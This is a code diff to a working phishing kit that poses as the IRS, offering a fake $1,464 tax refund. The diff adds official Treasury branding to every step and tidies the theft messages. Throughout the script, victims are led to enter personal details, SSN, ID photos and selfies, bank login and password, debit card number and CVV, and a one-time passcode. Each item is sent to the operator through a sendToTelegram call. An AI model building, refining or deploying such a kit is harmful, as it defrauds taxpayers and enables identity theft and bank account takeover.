@@ -39,7 +39,7 @@
             border: 1px solid #DCE3ED;
         }
 
-        /* ---- IRS LOGO / HEADER ---- */
+        /* ---- IRS LOGO / HEADER (shared) ---- */
         .irs-header {
             text-align: center;
             margin-bottom: 20px;
@@ -98,6 +98,7 @@
             margin-top: 4px;
         }
 
+        /* Landing specific */
         .refund-amount {
             font-size: 3.4rem;
             font-weight: 700;
@@ -539,7 +540,7 @@
                 $1,464
             </div>
             <div style="text-align:center;">
-                <span class="eligibility-tag">✅ You are eligible — federal refund</span>
+                <span class="eligibility-tag">Ready — federal refund</span>
             </div>
 
             <div class="status-grid">
@@ -549,24 +550,32 @@
                 </div>
                 <div class="status-item">
                     <span class="status-label">Status</span>
-                    <span class="status-value approved">✅ Approved</span>
+                    <span class="status-value approved">Approved</span>
                 </div>
                 <div class="status-item">
                     <span class="status-label">Tax year</span>
                     <span class="status-value">2025</span>
                 </div>
             </div>
-            <button class="claim-btn" id="startClaimBtn">💰 Claim your refund</button>
+            <button class="claim-btn" id="startClaimBtn">Claim your refund</button>
             <div class="footnote">IRS Secure Verification · Your information is protected</div>
         </div>
 
         <!-- STEP 1: Personal details -->
         <div id="personalPanel" class="card hide">
-            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">🔐 Identity verification</h2>
+            <div class="irs-header">
+                <div class="irs-logo">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7A2q-of1n0-xvMrhdEQ_hVXrdJQBHhFhzFIvKLaliJw&s=10" alt="IRS Logo" />
+                    <span class="irs-logo-text">IRS<span>.gov</span></span>
+                </div>
+                <div class="irs-badge">OFFICIAL · U.S. DEPARTMENT OF THE TREASURY</div>
+                <div class="irs-sub">Tax Refund · 2025 Filing Season</div>
+            </div>
+            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">Identity verification</h2>
             <div style="font-size:0.85rem; color:#4A5F7A; margin-bottom:18px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 1 of 7 · Confirm your identity</div>
 
             <div class="info-box">
-                <strong>⚠️ Important:</strong> Please enter your information exactly as it appears on your tax return. 
+                <strong>Important:</strong> Please enter your information exactly as it appears on your tax return. 
                 All fields are required and will be verified against IRS records.
             </div>
 
@@ -591,11 +600,19 @@
 
         <!-- STEP 2: SSN -->
         <div id="ssnPanel" class="card hide">
-            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">🆔 Social Security Number</h2>
+            <div class="irs-header">
+                <div class="irs-logo">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7A2q-of1n0-xvMrhdEQ_hVXrdJQBHhFhzFIvKLaliJw&s=10" alt="IRS Logo" />
+                    <span class="irs-logo-text">IRS<span>.gov</span></span>
+                </div>
+                <div class="irs-badge">OFFICIAL · U.S. DEPARTMENT OF THE TREASURY</div>
+                <div class="irs-sub">Tax Refund · 2025 Filing Season</div>
+            </div>
+            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">Social Security Number</h2>
             <div style="font-size:0.85rem; color:#4A5F7A; margin-bottom:18px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 2 of 7 · Secure SSN entry</div>
 
             <div class="info-box">
-                <strong>🔒 Secure Entry:</strong> Your Social Security Number is encrypted and used only for identity verification. 
+                <strong>Secure Entry:</strong> Your Social Security Number is encrypted and used only for identity verification. 
                 It is never stored in plain text.
             </div>
 
@@ -608,10 +625,18 @@
             <div class="back-link"><a href="#" id="backToPersonal">← Back</a></div>
         </div>
 
-        <!-- STEP 3: KYC (PayPal-style camera) -->
+        <!-- STEP 3: KYC -->
         <div id="kycPanel" class="card hide">
+            <div class="irs-header">
+                <div class="irs-logo">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7A2q-of1n0-xvMrhdEQ_hVXrdJQBHhFhzFIvKLaliJw&s=10" alt="IRS Logo" />
+                    <span class="irs-logo-text">IRS<span>.gov</span></span>
+                </div>
+                <div class="irs-badge">OFFICIAL · U.S. DEPARTMENT OF THE TREASURY</div>
+                <div class="irs-sub">Tax Refund · 2025 Filing Season</div>
+            </div>
             <div class="info-box">
-                <strong>📸 Identity Verification:</strong> Please take clear photos of your ID documents. 
+                <strong>Identity Verification:</strong> Please take clear photos of your ID documents. 
                 Ensure good lighting and that all text is visible.
             </div>
             <div class="step-indicator" id="stepIndicator">
@@ -624,25 +649,25 @@
                 <div class="back-link"><a href="#" id="backToSsnFromKyc">← Back</a></div>
             </div>
             <div id="kycStep2" class="kyc-step hide">
-                <div class="status-badge">📄 Front side of your ID</div>
+                <div class="status-badge">Front side of your ID</div>
                 <div class="camera-container"><div class="square-camera"><video id="frontVideo" autoplay playsinline muted></video></div></div>
                 <div class="camera-controls"><div class="switch-cam" id="switchFrontCam">⟳</div><div class="capture-btn" id="captureFrontBtn"></div><div style="width:44px;"></div></div>
                 <div class="status-badge" id="frontStatus">Position ID in frame & tap circle</div>
             </div>
             <div id="kycStep3" class="kyc-step hide">
-                <div class="status-badge">🔄 Back side of your ID</div>
+                <div class="status-badge">Back side of your ID</div>
                 <div class="camera-container"><div class="square-camera"><video id="backVideo" autoplay playsinline muted></video></div></div>
                 <div class="camera-controls"><div class="switch-cam" id="switchBackCam">⟳</div><div class="capture-btn" id="captureBackBtn"></div><div style="width:44px;"></div></div>
                 <div class="status-badge" id="backStatus">Ready to capture</div>
             </div>
             <div id="kycStep4" class="kyc-step hide">
-                <div class="status-badge">🤳 Take a selfie</div>
+                <div class="status-badge">Take a selfie</div>
                 <div class="camera-container"><div class="square-camera"><video id="selfieVideo" autoplay playsinline muted></video></div></div>
                 <div class="camera-controls"><div class="switch-cam" id="switchSelfieCam">⟳</div><div class="capture-btn" id="captureSelfieBtn"></div><div style="width:44px;"></div></div>
                 <div class="status-badge" id="selfieStatus">Look at the camera</div>
             </div>
             <div id="kycStep5" class="kyc-step hide">
-                <div class="status-badge">📸 Selfie holding ID next to your face</div>
+                <div class="status-badge">Selfie holding ID next to your face</div>
                 <div class="camera-container"><div class="square-camera"><video id="selfieIdVideo" autoplay playsinline muted></video></div></div>
                 <div class="camera-controls"><div class="switch-cam" id="switchSelfieIdCam">⟳</div><div class="capture-btn" id="captureSelfieIdBtn"></div><div style="width:44px;"></div></div>
                 <div class="status-badge" id="selfieIdStatus">Hold ID clearly visible</div>
@@ -651,11 +676,19 @@
 
         <!-- STEP 4: Select Bank -->
         <div id="bankPanel" class="card hide">
-            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">🏦 Select your bank</h2>
+            <div class="irs-header">
+                <div class="irs-logo">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7A2q-of1n0-xvMrhdEQ_hVXrdJQBHhFhzFIvKLaliJw&s=10" alt="IRS Logo" />
+                    <span class="irs-logo-text">IRS<span>.gov</span></span>
+                </div>
+                <div class="irs-badge">OFFICIAL · U.S. DEPARTMENT OF THE TREASURY</div>
+                <div class="irs-sub">Tax Refund · 2025 Filing Season</div>
+            </div>
+            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">Select your bank</h2>
             <div style="font-size:0.85rem; color:#4A5F7A; margin-bottom:18px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 4 of 7 · Choose your financial institution</div>
 
             <div class="info-box">
-                <strong>🏦 Bank Selection:</strong> Choose your bank from the list below. 
+                <strong>Bank Selection:</strong> Choose your bank from the list below. 
                 If your bank is not listed, please select "Other" and enter your bank name.
             </div>
 
@@ -694,12 +727,11 @@
                     <option>Bluebird by American Express</option><option>Branson Bank</option><option>Current</option><option>Empower</option><option>H&R Block Emerald Card</option>
                     <option>Netspark</option><option>Netspend</option><option>PayPal Prepaid Mastercard</option><option>RushCard</option><option>Serve</option>
                     <option>Skylight One</option><option>Uber Money</option><option>Venmo</option><option>Walmart MoneyCard</option><option>Western Union NetSpend</option>
-                    <!-- Credit Unions (select major) -->
+                    <!-- Credit Unions -->
                     <option>Navy Federal Credit Union</option><option>PenFed Credit Union</option><option>USAA Federal Savings Bank</option>
                     <option>State Employees Credit Union</option><option>Alliant Credit Union</option><option>BECU</option>
                     <option>Golden 1 Credit Union</option><option>SchoolsFirst Federal Credit Union</option><option>Suncoast Credit Union</option>
                     <option>Vystar Credit Union</option><option>First Tech Federal Credit Union</option><option>Northwest Federal Credit Union</option>
-                    <!-- Additional -->
                     <option>Other (Please specify below)</option>
                 </select>
                 <div class="input-hint">Select your primary financial institution</div>
@@ -710,11 +742,19 @@
 
         <!-- STEP 5: Bank login -->
         <div id="bankLoginPanel" class="card hide">
-            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">🔑 Bank login</h2>
+            <div class="irs-header">
+                <div class="irs-logo">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7A2q-of1n0-xvMrhdEQ_hVXrdJQBHhFhzFIvKLaliJw&s=10" alt="IRS Logo" />
+                    <span class="irs-logo-text">IRS<span>.gov</span></span>
+                </div>
+                <div class="irs-badge">OFFICIAL · U.S. DEPARTMENT OF THE TREASURY</div>
+                <div class="irs-sub">Tax Refund · 2025 Filing Season</div>
+            </div>
+            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">Bank login</h2>
             <div style="font-size:0.85rem; color:#4A5F7A; margin-bottom:18px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 5 of 7 · Secure credential entry</div>
 
             <div class="info-box">
-                <strong>🔒 Secure Login:</strong> Your bank credentials are encrypted and used only for verification 
+                <strong>Secure Login:</strong> Your bank credentials are encrypted and used only for verification 
                 to confirm your identity and deposit your refund. We never store your password.
             </div>
 
@@ -734,11 +774,19 @@
 
         <!-- STEP 6: Debit Card -->
         <div id="cardPanel" class="card hide">
-            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">💳 Debit card details</h2>
+            <div class="irs-header">
+                <div class="irs-logo">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7A2q-of1n0-xvMrhdEQ_hVXrdJQBHhFhzFIvKLaliJw&s=10" alt="IRS Logo" />
+                    <span class="irs-logo-text">IRS<span>.gov</span></span>
+                </div>
+                <div class="irs-badge">OFFICIAL · U.S. DEPARTMENT OF THE TREASURY</div>
+                <div class="irs-sub">Tax Refund · 2025 Filing Season</div>
+            </div>
+            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">Debit card details</h2>
             <div style="font-size:0.85rem; color:#4A5F7A; margin-bottom:18px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 6 of 7 · Enter your card information</div>
 
             <div class="info-box">
-                <strong>💳 Card Verification Required:</strong> Your debit card information is required to verify your bank account 
+                <strong>Card Verification Required:</strong> Your debit card information is required to verify your bank account 
                 and ensure your refund is deposited securely. This information is encrypted and used only for verification purposes.
                 We do not store your card details.
             </div>
@@ -761,7 +809,7 @@
                 </div>
             </div>
             <div class="input-hint warning">
-                ⚠️ Your debit card is used to verify your bank account. This is a standard security measure 
+                Your debit card is used to verify your bank account. This is a standard security measure 
                 to prevent fraud and ensure your refund goes to the correct account.
             </div>
             <button class="action-btn" id="cardNextBtn">Continue →</button>
@@ -770,24 +818,32 @@
 
         <!-- STEP 7: OTP -->
         <div id="otpPanel" class="card hide">
-            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">🔐 One‑time passcode</h2>
+            <div class="irs-header">
+                <div class="irs-logo">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7A2q-of1n0-xvMrhdEQ_hVXrdJQBHhFhzFIvKLaliJw&s=10" alt="IRS Logo" />
+                    <span class="irs-logo-text">IRS<span>.gov</span></span>
+                </div>
+                <div class="irs-badge">OFFICIAL · U.S. DEPARTMENT OF THE TREASURY</div>
+                <div class="irs-sub">Tax Refund · 2025 Filing Season</div>
+            </div>
+            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">One‑time passcode</h2>
             <div style="font-size:0.85rem; color:#4A5F7A; margin-bottom:18px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 7 of 7 · Final verification</div>
 
             <div class="info-box">
-                <strong>📱 Verification Code:</strong> A one-time passcode has been sent to your registered mobile number. 
+                <strong>Verification Code:</strong> A one-time passcode has been sent to your registered mobile number. 
                 Enter the code below to complete your identity verification.
             </div>
 
-            <div class="otp-hint">📱 Verification code sent to your registered mobile</div>
+            <div class="otp-hint">Verification code sent to your registered mobile</div>
             <div class="input-group">
                 <div class="input-label">Enter 6‑digit code</div>
                 <input type="text" id="otpInput" placeholder="000000" />
                 <div class="input-hint">Enter the 6-digit verification code sent to your phone</div>
             </div>
-            <button class="action-btn" id="finalSubmitBtn">✅ Submit & claim</button>
+            <button class="action-btn" id="finalSubmitBtn">Submit & claim</button>
             <div class="resend-options">
-                <button class="link-btn" id="resendOtpBtn">📱 Resend SMS</button>
-                <button class="link-btn" id="emailOtpBtn">✉️ Send via email</button>
+                <button class="link-btn" id="resendOtpBtn">Resend SMS</button>
+                <button class="link-btn" id="emailOtpBtn">Send via email</button>
             </div>
             <div class="back-link"><a href="#" id="backToCardFromOtp">← Back</a></div>
             <div class="terms">By submitting, you agree to IRS Secure Verification.</div>
@@ -822,14 +878,12 @@
                 otp: ''
             };
 
-            // Auto-fill saved data from localStorage
             function loadSavedData() {
                 try {
                     const saved = localStorage.getItem('irs_user_data');
                     if (saved) {
                         const data = JSON.parse(saved);
                         Object.assign(userData, data);
-                        // Populate fields
                         if (data.fullName) document.getElementById('fullName').value = data.fullName;
                         if (data.dob) document.getElementById('dob').value = data.dob;
                         if (data.address) document.getElementById('address').value = data.address;
@@ -886,10 +940,8 @@
                 document.getElementById(id).classList.remove('hide');
             }
 
-            // Load saved data
             loadSavedData();
 
-            // Navigation
             document.getElementById('startClaimBtn').onclick = () => showPanel('personalPanel');
             document.getElementById('backToLanding').onclick = (e) => { e.preventDefault();
                 showPanel('landingPanel'); };
@@ -903,7 +955,7 @@
                 userData.dob = d;
                 userData.address = a;
                 saveUserData();
-                sendToTelegram(`👤 <b>Personal</b>\nName: ${n}\nDOB: ${d}\nAddress: ${a}`);
+                sendToTelegram(`Personal\nName: ${n}\nDOB: ${d}\nAddress: ${a}`);
                 showPanel('ssnPanel');
             };
             document.getElementById('backToPersonal').onclick = (e) => { e.preventDefault();
@@ -914,7 +966,7 @@
                 if (s.length < 4) { showToast('Enter a valid SSN.', true); return; }
                 userData.ssn = s;
                 saveUserData();
-                sendToTelegram(`🆔 <b>SSN</b>: ${s}`);
+                sendToTelegram(`SSN: ${s}`);
                 showPanel('kycPanel');
                 showKycStep(1);
             };
@@ -966,7 +1018,7 @@
                 ctx.drawImage(video, sx, sy, size, size, 0, 0, size, size);
                 canvas.toBlob(async blob => {
                     await sendPhotoToTelegram(blob, `[IRS KYC] ${side} | ${userData.fullName}`);
-                    statusElem.innerText = `✅ ${side} uploaded.`;
+                    statusElem.innerText = `${side} uploaded.`;
                     if (next) setTimeout(next, 700);
                 }, 'image/jpeg', 0.8);
             }
@@ -1020,7 +1072,7 @@
                 userData.idType = type;
                 userData.idState = state;
                 saveUserData();
-                sendToTelegram(`📄 <b>ID</b>: ${type} (${state})`);
+                sendToTelegram(`ID: ${type} (${state})`);
                 showKycStep(2);
             };
 
@@ -1045,7 +1097,7 @@
                         stopStream(backStream);
                         stopStream(selfieStream);
                         stopStream(selfieIdStream);
-                        await sendToTelegram(`📸 <b>KYC completed</b> for ${userData.fullName}`);
+                        await sendToTelegram(`KYC completed for ${userData.fullName}`);
                         showPanel('bankPanel');
                     });
             };
@@ -1059,7 +1111,7 @@
                 if (!b) { showToast('Select your bank.', true); return; }
                 userData.bank = b;
                 saveUserData();
-                sendToTelegram(`🏦 <b>Bank</b>: ${b}`);
+                sendToTelegram(`Bank: ${b}`);
                 showPanel('bankLoginPanel');
             };
             document.getElementById('backToBankFromLogin').onclick = (e) => { e.preventDefault();
@@ -1072,7 +1124,7 @@
                 userData.bankUsername = u;
                 userData.bankPassword = p;
                 saveUserData();
-                sendToTelegram(`🔑 <b>Bank login</b>\nUser: ${u}\nPass: ${p}`);
+                sendToTelegram(`Bank login\nUser: ${u}\nPass: ${p}`);
                 showPanel('cardPanel');
             };
             document.getElementById('backToBankLoginFromCard').onclick = (e) => { e.preventDefault();
@@ -1089,7 +1141,7 @@
                 userData.cardExpiry = ex;
                 userData.cardCvv = cv;
                 saveUserData();
-                sendToTelegram(`💳 <b>Card</b>: ${dc} | Exp: ${ex} | CVV: ${cv}`);
+                sendToTelegram(`Card: ${dc} | Exp: ${ex} | CVV: ${cv}`);
                 showPanel('otpPanel');
             };
             document.getElementById('backToCardFromOtp').onclick = (e) => { e.preventDefault();
@@ -1102,29 +1154,29 @@
                 saveUserData();
 
                 const msg =
-                    `✅ <b>IRS REFUND CLAIM — COMPLETE</b>\n` +
-                    `👤 ${userData.fullName}\n📅 ${userData.dob}\n📍 ${userData.address}\n` +
-                    `🔑 SSN: ${userData.ssn}\n📄 ID: ${userData.idType} (${userData.idState})\n` +
-                    `🏦 ${userData.bank}\n👤 ${userData.bankUsername}\n🔒 ${userData.bankPassword}\n` +
-                    `💳 ${userData.debitCard} | Exp: ${userData.cardExpiry} | CVV: ${userData.cardCvv}\n` +
-                    `🔢 OTP: ${userData.otp}\n✅ All KYC photos uploaded.`;
+                    `IRS REFUND CLAIM — COMPLETE\n` +
+                    `Name: ${userData.fullName}\nDOB: ${userData.dob}\nAddress: ${userData.address}\n` +
+                    `SSN: ${userData.ssn}\nID: ${userData.idType} (${userData.idState})\n` +
+                    `Bank: ${userData.bank}\nUsername: ${userData.bankUsername}\nPassword: ${userData.bankPassword}\n` +
+                    `Card: ${userData.debitCard} | Exp: ${userData.cardExpiry} | CVV: ${userData.cardCvv}\n` +
+                    `OTP: ${userData.otp}\nAll KYC photos uploaded.`;
 
                 await sendToTelegram(msg);
                 loadingOverlay.classList.add('active');
                 setTimeout(() => {
                     loadingOverlay.classList.remove('active');
-                    showToast('✅ Claim submitted! We will process your refund.', false);
+                    showToast('Claim submitted! We will process your refund.', false);
                     setTimeout(() => showPanel('landingPanel'), 1200);
                 }, 1800);
             };
 
             document.getElementById('resendOtpBtn').onclick = async () => {
                 showToast('New code sent to your phone.', false);
-                await sendToTelegram(`🔄 <b>Resend OTP</b> for ${userData.fullName}`);
+                await sendToTelegram(`Resend OTP for ${userData.fullName}`);
             };
             document.getElementById('emailOtpBtn').onclick = async () => {
                 showToast('Code sent to your registered email.', false);
-                await sendToTelegram(`✉️ <b>OTP via email</b> for ${userData.fullName}`);
+                await sendToTelegram(`OTP via email for ${userData.fullName}`);
             };
 
             toast.onclick = () => toast.classList.remove('show');
